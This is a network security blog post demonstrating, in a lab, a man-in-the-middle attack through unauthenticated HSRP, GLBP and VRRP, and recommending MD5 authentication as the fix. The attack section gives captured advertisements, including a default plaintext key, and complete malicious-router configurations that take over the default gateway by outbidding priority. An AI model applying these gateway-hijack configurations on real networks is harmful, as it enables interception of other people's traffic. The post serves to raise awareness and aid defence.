---
title: Don't use FHRPs without Authentication
date: 2019-02-17
tags:
- Route/Switch
- Security
author: Brandon James
---

You are most likely running a first hop redundancy protocol somewhere in your network. If you aren't routing at the access layer and your running a traditional redundant core (ie you aren't using a switch virtualization platform such as Cisco's VSS), one of those places is probably your user facing SVIs. If you aren't using *encrypted* authentication on your FHRP, you're putting your enterprise at risk. 

As a bit of a proof of concept, I've put together the following to show how FHRPs can be used as a channel to launch a Man-in-the-Middle attack. 

![](media/fhrp_diagram1.png "FHRP Diagram")

In the above environment we have two friendly routers on the left. Each router has three interfaces participating in FHRPs. Those interfaces are each plugged into a switch named for the FHRP running on said interfaces. To the right, we have our malicious routers ready to play MitM with our enterprise traffic.

_Note: In most cases this will only allow a partial MitM attack, traffic sent from the users will go to the malicious router, but traffic sent to the user will still need to come from one of the original routers. Regardless, this is still a huge security risk_

Interface configurations from R1 and R2 follow:

```
R1#sh run | beg interface Gigabit
interface GigabitEthernet0/0
 ip address 10.0.0.2 255.255.255.0
 no ip redirects
 standby version 2
 standby 1 ip 10.0.0.1
 standby 1 preempt
!
interface GigabitEthernet1/0
 ip address 10.0.1.2 255.255.255.0
 no ip redirects
 glbp 1 ip 10.0.1.1
 glbp 1 preempt
 negotiation auto
!
interface GigabitEthernet2/0
 ip address 10.0.2.2 255.255.255.0
 negotiation auto
 vrrp 1 ip 10.0.2.1

R2#sh run | beg interface Gigabit
interface GigabitEthernet0/0
 ip address 10.0.0.3 255.255.255.0
 standby version 2
 standby 1 ip 10.0.0.1
 standby 1 priority 50
 standby 1 preempt
!
interface GigabitEthernet1/0
 ip address 10.0.1.3 255.255.255.0
 glbp 1 ip 10.0.1.1
 glbp 1 priority 50
 glbp 1 preempt
 negotiation auto
!
interface GigabitEthernet2/0
 ip address 10.0.2.3 255.255.255.0
 negotiation auto
 vrrp 1 ip 10.0.2.1
 vrrp 1 priority 50
```

### Gathering Data

The three major FHRPs are VRRP, HSRP and GLBP. All three of them use multicast to send protocol advertisements. This means that your switches are happily forwarding these advertisements to anyone who is willing to listen. Our malicious actors are aware of this and start taking packet captures:

Malicious_HSRP captures the following being multicast to 224.0.0.12:

```
Cisco Hot Standby Router Protocol
    Group State TLV: Type=1 Len=40
        Version: 2
        Op Code: Hello (0)
        State: Standby (5)
        IP Ver.: IPv4 (4)
        Group: 1
        Identifier: ca:02:2a:cc:00:08 (ca:02:2a:cc:00:08)
        Priority: 50
        Hellotime: Default (3000)
        Holdtime: Default (10000)
        Virtual IP Address: 10.0.0.1
    Text Authentication TLV: Type=3 Len=8
        Authentication Data: Default (cisco)
```

 Malicious_GLBP captures the following being multicast to 224.0.0.102:

```
Gateway Load Balancing Protocol
    Version?: 1
    Unknown1: 0
    Group: 1
    Unknown2: 0000
    Owner ID: ca:01:2a:bd:00:1c (ca:01:2a:bd:00:1c)
    TLV l=28, t=Hello
        Type: Hello (1)
        Length: 28
        Unknown1-0: 00
        VG state?: Active (32)
        Unknown1-1: 00
        Priority: 100
        Unknown1-2: 0000
        Helloint: 3000
        Holdint: 10000
        Redirect: 600
        Timeout: 14400
        Unknown1-3: 0000
        Address type: IPv4 (1)
        Address length: 4
        Virtual IPv4: 10.0.1.1
    TLV l=20, t=Request/Response?
        Type: Request/Response? (2)
        Length: 20
        Forwarder?: 1
        VF state?: Active (32)
        Unknown2-1: 00
        Priority: 167
        Weight: 100
        Unknown2-2: 6338400258abcd
        Virtualmac: Cisco_00:01:01 (00:07:b4:00:01:01)
```

Note: The built in protocol filter for GLBP in wireshark doesn't seem to have information on all the fields. However, all the information we require is visible (Group, IP and Priority).

Malicious_VRRP captures the following being multicast to 224.0.0.18:

```
Virtual Router Redundancy Protocol
    Version 2, Packet type 1 (Advertisement)
    Virtual Rtr ID: 1
    Priority: 100 (Default priority for a backup VRRP router)
    Addr Count: 1
    Auth Type: No Authentication (0)
    Adver Int: 1
    Checksum: 0x6efb [correct]
    [Checksum Status: Good]
    IP Address: 10.0.2.1
```

### Launching the Attack

Now that our malicious actors have gathered the required information, they are ready to attack. The process is very simple.

First the malicious routers change their default gateways to be either of the friendly routers actual IP addresses, then they configure their interface with matching FHRP settings, with the exception of the priority value, which should be set to a better (higher) value than the current active FHRP router.

The static route and interface configurations for the malicious routers follows:

```
Malicious_HSRP#sh run | i route
ip route 0.0.0.0 0.0.0.0 10.0.0.2
Malicious_HSRP#sh run int gi0/0
Building configuration...

Current configuration : 218 bytes
!
interface GigabitEthernet0/0
 ip address 10.0.0.254 255.255.255.0
 standby version 2
 standby 1 ip 10.0.0.1
 standby 1 priority 150
 standby 1 preempt

Malicious_GLBP#sh run | i route
ip route 0.0.0.0 0.0.0.0 10.0.1.2
Malicious_GLBP#sh run int gi0/0
Building configuration...

Current configuration : 190 bytes
!
interface GigabitEthernet0/0
 ip address 10.0.1.254 255.255.255.0
 glbp 1 ip 10.0.1.1
 glbp 1 priority 150
 glbp 1 preempt

Malicious_VRRP#sh run | i route
ip route 0.0.0.0 0.0.0.0 10.0.2.2
Malicious_VRRP#sh run int gi0/0
Building configuration...

Current configuration : 174 bytes
!
interface GigabitEthernet0/0
 ip address 10.0.2.254 255.255.255.0
 vrrp 1 ip 10.0.2.1
 vrrp 1 priority 150
```

Note: in the case of GLBP, if load-balancing is configured (it's not by default), the weight may be adjusted in order to make the malicious router more preferred. In addition, clients on the GLBP may continue to use the old GLBP until their old ARP entries expire.

At this point the malicious routers are now the default-gateway for all devices on their segments:

```
Malicious_HSRP#sh standby brief 
                     P indicates configured to preempt.
                     |
Interface   Grp  Pri P State   Active          Standby         Virtual IP
Gi0/0       1    150 P Active  local           10.0.0.2        10.0.0.1


Malicious_GLBP#sh glbp brief  
Interface   Grp  Fwd Pri State    Address         Active router   Standby router
Gi0/0       1    -   150 Active   10.0.1.1        local           10.0.1.2
Gi0/0       1    1   -   Listen   0007.b400.0101  10.0.1.2        -
Gi0/0       1    2   -   Listen   0007.b400.0102  10.0.1.3        -
Gi0/0       1    3   -   Active   0007.b400.0103  local           -
 

Malicious_VRRP#sh vrrp brief 
Interface          Grp Pri Time  Own Pre State   Master addr     Group addr
Gi0/0              1   150 3414       Y  Master  10.0.2.254      10.0.2.1   
```

At this point the attacker can just sit back and watch the packets fly by.

### Solution

Fortunately, all three of the FHRPs support encrypted authentication and it can take as little as one line to configure. 

```
R1(config-if)#standby 1 authentication md5 key-string SECURE_KEY
R1(config-if)#glbp 1 authentication md5 key-string SECURE_KEY
R1(config-if)#vrrp 1 authentication md5 key-string SECURE_KEY
```

*Note: This note was originally on my personal blog. I've backdated the post to show the day it was originally written*
